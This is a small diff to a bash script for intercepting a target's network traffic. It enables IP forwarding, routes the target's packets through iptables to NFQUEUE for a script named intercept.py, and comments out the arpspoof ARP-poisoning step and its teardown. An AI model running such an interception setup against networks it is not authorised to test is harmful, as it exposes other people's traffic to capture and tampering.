@@ -14,12 +14,12 @@ echo "" > log
 trap 'end' INT
 
 function end() {
-	kill $PID1
+#	kill $PID1
 	kill $PID2
 	iptables -D FORWARD 1
 	iptables -D FORWARD 1
 	echo "Shutting down..."
-	wait $PID1
+#	wait $PID1
 }
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -27,8 +27,8 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -A FORWARD -i $interface -d $target -j NFQUEUE --queue-num 0
 iptables -A FORWARD -i $interface -s $target -j NFQUEUE --queue-num 0
 
-arpspoof -i $interface -t $target -r $router > arpspoof.log 2>&1 &
-PID1=$!
+#arpspoof -i $interface -t $target -r $router > arpspoof.log 2>&1 &
+#PID1=$!
 
 ./intercept.py 2>&1 &
 PID2=$!
